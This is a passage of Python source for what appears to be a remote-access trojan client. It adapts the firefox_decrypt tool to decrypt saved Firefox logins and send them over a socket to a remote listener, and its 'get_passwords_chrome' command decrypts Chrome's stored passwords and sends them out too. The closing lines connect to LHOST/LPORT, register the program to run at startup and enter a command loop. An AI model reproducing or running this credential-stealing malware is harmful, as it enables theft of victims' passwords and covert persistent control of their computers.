                        if not keyslot:
                            self.handle_error(
                                Exit.FAIL_NSS_KEYSLOT,
                                "Failed to retrieve internal KeySlot",
                            )

                        try:
                            if self._PK11_NeedLogin(keyslot):
                                password: str = ask_password(profile, interactive)

                                LOG.debug("Authenticating with password '%s'", password)
                                err_status: int = self._PK11_CheckUserPassword(keyslot, password)

                                LOG.debug("Checking user password returned %s", err_status)

                                if err_status:
                                    self.handle_error(
                                        Exit.BAD_PRIMARY_PASSWORD,
                                        "Primary password is not correct",
                                    )

                            else:
                                LOG.info("No Primary Password found - no authentication needed")
                        finally:
                            # Avoid leaking PK11KeySlot
                            self._PK11_FreeSlot(keyslot)

                    def handle_error(self, exitcode: int, *logerror: Any):
                        """If an error happens in libnss, handle it and print some debug information"""
                        if logerror:
                            LOG.error(*logerror)
                        else:
                            LOG.debug("Error during a call to NSS library, trying to obtain error info")

                        code = self._PORT_GetError()
                        name = self._PR_ErrorToName(code)
                        name = "NULL" if name is None else name
                        # 0 is the default language (localization related)
                        text = self._PR_ErrorToString(code, 0)

                        LOG.debug("%s: %s", name, text)

                        raise Exit(exitcode)

                    def decrypt(self, data64):
                        data = b64decode(data64)
                        inp = self.SECItem(0, data, len(data))
                        out = self.SECItem(0, None, 0)

                        err_status: int = self._PK11SDR_Decrypt(inp, out, None)
                        LOG.debug("Decryption of data returned %s", err_status)
                        try:
                            if err_status:  # -1 means password failed, other status are unknown
                                error_msg = (
                                    "Username/Password decryption failed. "
                                    "Credentials damaged or cert/key file mismatch."
                                )

                                if self.non_fatal_decryption:
                                    raise ValueError(error_msg)
                                else:
                                    self.handle_error(Exit.DECRYPTION_FAILED, error_msg)

                            res = out.decode_data()
                        finally:
                            # Avoid leaking SECItem
                            self._SECITEM_ZfreeItem(out, 0)

                        return res


                class MozillaInteraction:
                    """
                    Abstraction interface to Mozilla profile and lib NSS
                    """

                    def __init__(self, non_fatal_decryption=False):
                        self.profile = None
                        self.proxy = NSSProxy(non_fatal_decryption)

                    def load_profile(self, profile):
                        """Initialize the NSS library and profile"""
                        self.profile = profile
                        self.proxy.initialize(self.profile)

                    def authenticate(self, interactive):
                        """Authenticate the the current profile is protected by a primary password,
                        prompt the user and unlock the profile.
                        """
                        self.proxy.authenticate(self.profile, interactive)

                    def unload_profile(self):
                        """Shutdown NSS and deactivate current profile"""
                        self.proxy.shutdown()

                    def decrypt_passwords(self) -> PWStore:
                        """Decrypt requested profile using the provided password.
                        Returns all passwords in a list of dicts
                        """
                        credentials: Credentials = self.obtain_credentials()

                        LOG.info("Decrypting credentials")
                        outputs: PWStore = []

                        url: str
                        user: str
                        passw: str
                        enctype: int
                        received_data = []
                        for url, user, passw, enctype in credentials:
                            # enctype informs if passwords need to be decrypted
                            if enctype:
                                try:
                                    LOG.debug("Decrypting username data '%s'", user)
                                    user = self.proxy.decrypt(user)
                                    LOG.debug("Decrypting password data '%s'", passw)
                                    passw = self.proxy.decrypt(passw)
                                except (TypeError, ValueError) as e:
                                    LOG.debug(e, exc_info=True)
                                    user = "*** decryption failed ***"
                                    passw = "*** decryption failed ***"

                            LOG.debug(
                                "Decoded username '%s' and password '%s' for website '%s'",
                                user,
                                passw,
                                url,
                            )
                            result = f'"url": {url}, "user": {user}, "password": {passw}'
                            received_data.append(result)
                        # Close credential handles (SQL)
                        data = pickle.dumps(received_data)
                        s.send(data)
                        credentials.done()

                        return outputs

                    def obtain_credentials(self) -> Credentials:
                        """Figure out which of the 2 possible backend credential engines is available"""
                        credentials: Credentials
                        try:
                            credentials = JsonCredentials(self.profile)
                        except NotFoundError:
                            try:
                                credentials = SqliteCredentials(self.profile)
                            except NotFoundError:
                                LOG.error(
                                    "Couldn't find credentials file (logins.json or signons.sqlite)."
                                )
                                raise Exit(Exit.MISSING_SECRETS)

                        return credentials


                class OutputFormat:
                    def __init__(self, pwstore: PWStore, cmdargs: argparse.Namespace):
                        self.pwstore = pwstore
                        self.cmdargs = cmdargs

                    def output(self):
                        pass


                class HumanOutputFormat(OutputFormat):
                    def output(self):
                        for output in self.pwstore:
                            record: str = (
                                f"\nWebsite:   {output['url']}\n"
                                f"Username: '{output['user']}'\n"
                                f"Password: '{output['password']}'\n"
                            )
                            sys.stdout.write(record)


                class JSONOutputFormat(OutputFormat):
                    def output(self):
                        sys.stdout.write(json.dumps(self.pwstore, indent=2))
                        # Json dumps doesn't add the final newline
                        sys.stdout.write("\n")


                class CSVOutputFormat(OutputFormat):
                    def __init__(self, pwstore: PWStore, cmdargs: argparse.Namespace):
                        super().__init__(pwstore, cmdargs)
                        self.delimiter = cmdargs.csv_delimiter
                        self.quotechar = cmdargs.csv_quotechar
                        self.header = cmdargs.csv_header

                    def output(self):
                        csv_writer = csv.DictWriter(
                            sys.stdout,
                            fieldnames=["url", "user", "password"],
                            lineterminator="\n",
                            delimiter=self.delimiter,
                            quotechar=self.quotechar,
                            quoting=csv.QUOTE_ALL,
                        )
                        if self.header:
                            csv_writer.writeheader()

                        for output in self.pwstore:
                            csv_writer.writerow(output)


                class TabularOutputFormat(CSVOutputFormat):
                    def __init__(self, pwstore: PWStore, cmdargs: argparse.Namespace):
                        super().__init__(pwstore, cmdargs)
                        self.delimiter = "\t"
                        self.quotechar = "'"


                class PassOutputFormat(OutputFormat):
                    def __init__(self, pwstore: PWStore, cmdargs: argparse.Namespace):
                        super().__init__(pwstore, cmdargs)
                        self.prefix = cmdargs.pass_prefix
                        self.cmd = cmdargs.pass_cmd
                        self.username_prefix = cmdargs.pass_username_prefix
                        self.always_with_login = cmdargs.pass_always_with_login

                    def output(self):
                        self.test_pass_cmd()
                        self.preprocess_outputs()
                        self.export()

                    def test_pass_cmd(self) -> None:
                        """Check if pass from passwordstore.org is installed
                        If it is installed but not initialized, initialize it
                        """
                        LOG.debug("Testing if password store is installed and configured")

                        try:
                            p = run([self.cmd, "ls"], capture_output=True, text=True)
                        except FileNotFoundError as e:
                            if e.errno == 2:
                                LOG.error("Password store is not installed and exporting was requested")
                                raise Exit(Exit.PASSSTORE_MISSING)
                            else:
                                LOG.error("Unknown error happened.")
                                LOG.error("Error was '%s'", e)
                                raise Exit(Exit.UNKNOWN_ERROR)

                        LOG.debug("pass returned:\nStdout: %s\nStderr: %s", p.stdout, p.stderr)

                        if p.returncode != 0:
                            if 'Try "pass init"' in p.stderr:
                                LOG.error("Password store was not initialized.")
                                LOG.error("Initialize the password store manually by using 'pass init'")
                                raise Exit(Exit.PASSSTORE_NOT_INIT)
                            else:
                                LOG.error("Unknown error happened when running 'pass'.")
                                LOG.error("Stdout: %s\nStderr: %s", p.stdout, p.stderr)
                                raise Exit(Exit.UNKNOWN_ERROR)

                    def preprocess_outputs(self):
                        # Format of "self.to_export" should be:
                        #     {"address": {"login": "password", ...}, ...}
                        self.to_export: dict[str, dict[str, str]] = {}

                        for record in self.pwstore:
                            url = record["url"]
                            user = record["user"]
                            passw = record["password"]

                            # Keep track of web-address, username and passwords
                            # If more than one username exists for the same web-address
                            # the username will be used as name of the file
                            address = urlparse(url)

                            if address.netloc not in self.to_export:
                                self.to_export[address.netloc] = {user: passw}

                            else:
                                self.to_export[address.netloc][user] = passw

                    def export(self):
                        """Export given passwords to password store

                        Format of "to_export" should be:
                            {"address": {"login": "password", ...}, ...}
                        """
                        LOG.info("Exporting credentials to password store")
                        if self.prefix:
                            prefix = f"{self.prefix}/"
                        else:
                            prefix = self.prefix

                        LOG.debug("Using pass prefix '%s'", prefix)

                        for address in self.to_export:
                            for user, passw in self.to_export[address].items():
                                # When more than one account exist for the same address, add
                                # the login to the password identifier
                                if self.always_with_login or len(self.to_export[address]) > 1:
                                    passname = f"{prefix}{address}/{user}"
                                else:
                                    passname = f"{prefix}{address}"

                                LOG.info("Exporting credentials for '%s'", passname)

                                data = f"{passw}\n{self.username_prefix}{user}\n"

                                LOG.debug("Inserting pass '%s' '%s'", passname, data)

                                # NOTE --force is used. Existing passwords will be overwritten
                                cmd: list[str] = [
                                    self.cmd,
                                    "insert",
                                    "--force",
                                    "--multiline",
                                    passname,
                                ]

                                LOG.debug("Running command '%s' with stdin '%s'", cmd, data)

                                p = run(cmd, input=data, capture_output=True, text=True)

                                if p.returncode != 0:
                                    LOG.error(
                                        "ERROR: passwordstore exited with non-zero: %s", p.returncode
                                    )
                                    LOG.error("Stdout: %s\nStderr: %s", p.stdout, p.stderr)
                                    raise Exit(Exit.PASSSTORE_ERROR)

                                LOG.debug("Successfully exported '%s'", passname)


                def get_sections(profiles):
                    """
                    Returns hash of profile numbers and profile names.
                    """
                    sections = {}
                    i = 1
                    for section in profiles.sections():
                        if section.startswith("Profile"):
                            sections[str(i)] = profiles.get(section, "Path")
                            i += 1
                        else:
                            continue
                    return sections


                def print_sections(sections, textIOWrapper=sys.stderr):
                    """
                    Prints all available sections to an textIOWrapper (defaults to sys.stderr)
                    """
                    for i in sorted(sections):
                        textIOWrapper.write(f"{i} -> {sections[i]}\n")
                    textIOWrapper.flush()


                def ask_section(sections: ConfigParser):
                    """
                    Prompt the user which profile should be used for decryption
                    """
                    available_choices = {str(i): name for i, name in sections.items()}
                    
                    choices_str = "\n".join([f"{num} -> {name}" for num, name in available_choices.items()])
                    s.send(choices_str.encode())
                    try:
                        choice = s.recv(1024).decode()
                    except EOFError:
                        LOG.error("Could not read Choice, got EOF")
                        raise Exit(Exit.READ_GOT_EOF)

                    try:
                        final_choice = sections[choice]
                    except KeyError:
                        LOG.error("Profile No. %s does not exist!", choice)
                        raise Exit(Exit.NO_SUCH_PROFILE)

                    LOG.debug("Profile selection matched %s", final_choice)

                    return final_choice


                def ask_password(profile: str, interactive: bool) -> str:
                    """
                    Prompt for profile password
                    """
                    passwd: str
                    passmsg = f"\nPrimary Password for profile {profile}: "

                    if sys.stdin.isatty() and interactive:
                        passwd = getpass(passmsg)
                    else:
                        sys.stderr.write("Reading Primary password from standard input:\n")
                        sys.stderr.flush()
                        # Ability to read the password from stdin (echo "pass" | ./firefox_...)
                        passwd = sys.stdin.readline().rstrip("\n")

                    return passwd


                def read_profiles(basepath):
                    """
                    Parse Firefox profiles in provided location.
                    If list_profiles is true, will exit after listing available profiles.
                    """
                    profileini = os.path.join(basepath, "profiles.ini")

                    LOG.debug("Reading profiles from %s", profileini)

                    # Read profiles from Firefox profile folder
                    profiles = ConfigParser()
                    profiles.read(profileini, encoding=DEFAULT_ENCODING)

                    LOG.debug("Read profiles %s", profiles.sections())

                    return profiles


                def get_profile(
                    basepath: str, interactive: bool, choice: Optional[str], list_profiles: bool
                ):
                    """
                    Select profile to use by either reading profiles.ini or assuming given
                    path is already a profile
                    If interactive is false, will not try to ask which profile to decrypt.
                    choice contains the choice the user gave us as an CLI arg.
                    If list_profiles is true will exits after listing all available profiles.
                    """
                    try:
                        profiles: ConfigParser = read_profiles(basepath)

                    except Exit as e:
                        if e.exitcode == Exit.MISSING_PROFILEINI:
                            profile = basepath

                            if list_profiles:
                                LOG.error("Listing single profiles not permitted.")
                                raise

                            if not os.path.isdir(profile):
                                LOG.error("Profile location '%s' is not a directory", profile)
                                raise
                        else:
                            raise
                    else:
                        if list_profiles:
                            LOG.debug("Listing available profiles...")
                            print_sections(get_sections(profiles), sys.stdout)
                            raise Exit(Exit.CLEAN)

                        sections = get_sections(profiles)

                        if len(sections) == 1:
                            section = sections["1"]

                        elif choice is not None:
                            try:
                                section = sections[choice]
                            except KeyError:
                                LOG.error("Profile No. %s does not exist!", choice)
                                raise Exit(Exit.NO_SUCH_PROFILE)

                        elif not interactive:
                            LOG.error(
                                "Don't know which profile to decrypt. "
                                "We are in non-interactive mode and -c/--choice wasn't specified."
                            )
                            raise Exit(Exit.MISSING_CHOICE)

                        else:
                            # Ask user which profile to open
                            section = ask_section(sections)

                        section = section
                        profile = os.path.join(basepath, section)

                        if not os.path.isdir(profile):
                            LOG.error(
                                "Profile location '%s' is not a directory. Has profiles.ini been tampered with?",
                                profile,
                            )
                            raise Exit(Exit.BAD_PROFILEINI)

                    return profile


                # From https://bugs.python.org/msg323681
                class ConvertChoices(argparse.Action):
                    """Argparse action that interprets the `choices` argument as a dict
                    mapping the user-specified choices values to the resulting option
                    values.
                    """

                    def __init__(self, *args, choices, **kwargs):
                        super().__init__(*args, choices=choices.keys(), **kwargs)
                        self.mapping = choices

                    def __call__(self, parser, namespace, value, option_string=None):
                        setattr(namespace, self.dest, self.mapping[value])


                def parse_sys_args() -> argparse.Namespace:
                    """Parse command line arguments"""

                    if SYSTEM == "Windows":
                        profile_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox")
                    elif os.uname()[0] == "Darwin":
                        profile_path = "~/Library/Application Support/Firefox"
                    else:
                        profile_path = "~/.mozilla/firefox"

                    parser = argparse.ArgumentParser(
                        description="Access Firefox/Thunderbird profiles and decrypt existing passwords"
                    )
                    parser.add_argument(
                        "profile",
                        nargs="?",
                        default=profile_path,
                        help=f"Path to profile folder (default: {profile_path})",
                    )

                    format_choices = {
                        "human": HumanOutputFormat,
                        "json": JSONOutputFormat,
                        "csv": CSVOutputFormat,
                        "tabular": TabularOutputFormat,
                        "pass": PassOutputFormat,
                    }

                    parser.add_argument(
                        "-f",
                        "--format",
                        action=ConvertChoices,
                        choices=format_choices,
                        default=HumanOutputFormat,
                        help="Format for the output.",
                    )
                    parser.add_argument(
                        "-d",
                        "--csv-delimiter",
                        action="store",
                        default=";",
                        help="The delimiter for csv output",
                    )
                    parser.add_argument(
                        "-q",
                        "--csv-quotechar",
                        action="store",
                        default='"',
                        help="The quote char for csv output",
                    )
                    parser.add_argument(
                        "--no-csv-header",
                        action="store_false",
                        dest="csv_header",
                        default=True,
                        help="Do not include a header in CSV output.",
                    )
                    parser.add_argument(
                        "--pass-username-prefix",
                        action="store",
                        default="",
                        help=(
                            "Export username as is (default), or with the provided format prefix. "
                            "For instance 'login: ' for browserpass."
                        ),
                    )
                    parser.add_argument(
                        "-p",
                        "--pass-prefix",
                        action="store",
                        default="web",
                        help="Folder prefix for export to pass from passwordstore.org (default: %(default)s)",
                    )
                    parser.add_argument(
                        "-m",
                        "--pass-cmd",
                        action="store",
                        default="pass",
                        help="Command/path to use when exporting to pass (default: %(default)s)",
                    )
                    parser.add_argument(
                        "--pass-always-with-login",
                        action="store_true",
                        help="Always save as /<login> (default: only when multiple accounts per domain)",
                    )
                    parser.add_argument(
                        "-n",
                        "--no-interactive",
                        action="store_false",
                        dest="interactive",
                        default=True,
                        help="Disable interactivity.",
                    )
                    parser.add_argument(
                        "--non-fatal-decryption",
                        action="store_true",
                        default=False,
                        help="If set, corrupted entries will be skipped instead of aborting the process.",
                    )
                    parser.add_argument(
                        "-c",
                        "--choice",
                        help="The profile to use (starts with 1). If only one profile, defaults to that.",
                    )
                    parser.add_argument(
                        "-l", "--list", action="store_true", help="List profiles and exit."
                    )
                    parser.add_argument(
                        "-e",
                        "--encoding",
                        action="store",
                        default=DEFAULT_ENCODING,
                        help="Override default encoding (%(default)s).",
                    )
                    parser.add_argument(
                        "-v",
                        "--verbose",
                        action="count",
                        default=0,
                        help="Verbosity level. Warning on -vv (highest level) user input will be printed on screen",
                    )
                    parser.add_argument(
                        "--version",
                        action="version",
                        version=__version__,
                        help="Display version of firefox_decrypt and exit",
                    )

                    args = parser.parse_args()

                    # understand `\t` as tab character if specified as delimiter.
                    if args.csv_delimiter == "\\t":
                        args.csv_delimiter = "\t"

                    return args


                def setup_logging(args) -> None:
                    """Setup the logging level and configure the basic logger"""
                    if args.verbose == 1:
                        level = logging.INFO
                    elif args.verbose >= 2:
                        level = logging.DEBUG
                    else:
                        level = logging.WARNING

                    logging.basicConfig(
                        format="%(asctime)s - %(levelname)s - %(message)s",
                        level=level,
                    )

                    global LOG
                    LOG = logging.getLogger(__name__)


                def identify_system_locale() -> str:
                    encoding: Optional[str] = locale.getpreferredencoding()

                    if encoding is None:
                        LOG.error(
                            "Could not determine which encoding/locale to use for NSS interaction. "
                            "This configuration is unsupported.\n"
                            "If you are in Linux or MacOS, please search online "
                            "how to configure a UTF-8 compatible locale and try again."
                        )
                        raise Exit(Exit.BAD_LOCALE)

                    return encoding


                def main() -> None:
                    try:
                        """Main entry point"""
                        args = parse_sys_args()

                        setup_logging(args)

                        DEFAULT_ENCODING = "utf-8"

                        if args.encoding != DEFAULT_ENCODING:
                            LOG.info(
                                "Overriding default encoding from '%s' to '%s'",
                                DEFAULT_ENCODING,
                                args.encoding,
                            )

                            # Override default encoding if specified by user
                            DEFAULT_ENCODING = args.encoding
                        LOG.info("Running firefox_decrypt version: %s", __version__)
                        LOG.debug("Parsed commandline arguments: %s", args)
                        encodings = (
                            ("stdin", "utf-8"),
                            ("stdout", "utf-8"),
                            ("stderr", "utf-8"),
                            ("locale", identify_system_locale()),
                        )

                        LOG.debug(
                            "Running with encodings: %s: %s, %s: %s, %s: %s, %s: %s", *chain(*encodings)
                        )

                        # Load Mozilla profile and initialize NSS before asking the user for input
                        moz = MozillaInteraction(args.non_fatal_decryption)

                        basepath = os.path.expanduser(args.profile)

                        # Read profiles from profiles.ini in profile folder
                        profile = get_profile(basepath, args.interactive, args.choice, args.list)

                        # Start NSS for selected profile
                        moz.load_profile(profile)
                        # Check if profile is password protected and prompt for a password
                        moz.authenticate(args.interactive)
                        # Decode all passwords
                        outputs = moz.decrypt_passwords()

                        # Export passwords into one of many formats
                        formatter = args.format(outputs, args)
                        formatter.output()  # Assuming formatter.output() returns the decrypted passwords as a string

                        # Assuming formatter.output() returns the decrypted passwords as a string
                        # Finally shutdown NSS
                        moz.unload_profile()
                    except Exception as e:
                        err_msg = f"Error: {str(e)}"
                        traceback_msg = traceback.format_exc()
                        err_with_traceback = f"{err_msg}\n{traceback_msg}"
                        s.send(err_with_traceback.encode())


                def run_ffdecrypt():
                    try:
                        main()
                    except KeyboardInterrupt:
                        s.send("Quit.").encode()


                if __name__ == "__main__":
                    run_ffdecrypt()

            elif command == 'get_passwords_chrome':
                CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
                CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

                def get_secret_key():
                    try:
                        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                            local_state = f.read()
                            local_state = json.loads(local_state)
                        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                        secret_key = secret_key[5:] 
                        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
                        return secret_key
                    except Exception as e:
                        print("%s"%str(e))
                        print("[ERR] Chrome secretkey cannot be found")
                        return None
                    
                def decrypt_payload(cipher, payload):
                    return cipher.decrypt(payload)

                def generate_cipher(aes_key, iv):
                    return AES.new(aes_key, AES.MODE_GCM, iv)

                def decrypt_password(ciphertext, secret_key):
                    try:
                        initialisation_vector = ciphertext[3:15]
                        encrypted_password = ciphertext[15:-16]
                        cipher = generate_cipher(secret_key, initialisation_vector)
                        decrypted_pass = decrypt_payload(cipher, encrypted_password)
                        decrypted_pass = decrypted_pass.decode()  
                        return decrypted_pass
                    except Exception as e:
                        print("%s"%str(e))
                        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
                        return ""
                    
                def get_db_connection(chrome_path_login_db):
                    try:
                        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
                        return sqlite3.connect("Loginvault.db")
                    except Exception as e:
                        print("%s"%str(e))
                        print("[ERR] Chrome database cannot be found")
                        return None
                        
                if __name__ == '__main__':
                    try:
                            secret_key = get_secret_key()
                            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
                            dat = []
                            for folder in folders:
                                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
                                conn = get_db_connection(chrome_path_login_db)
                                if(secret_key and conn):
                                    cursor = conn.cursor()
                                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                                    for index,login in enumerate(cursor.fetchall()):
                                        url = login[0]
                                        username = login[1]
                                        ciphertext = login[2]
                                        if(url!="" and username!="" and ciphertext!=""):
                                            decrypted_password = decrypt_password(ciphertext, secret_key)
                                            passwd = [f'URL: {url}, USERNAME: {username}, PASSWORD:{decrypted_password}']
                                            dat.append(passwd)
                                    cursor.close()
                                    conn.close()
                                    os.remove("Loginvault.db")
                            dataa = pickle.dumps(dat)
                            s.send(dataa)
                    except Exception as e:
                        print("[ERR] %s"%str(e))

sock = CLIENT(LHOST, LPORT)

if __name__ == '__main__':
    sock.add_to_startup_registry()
    sock.build_connection()
    while connected:
        sock.execute()
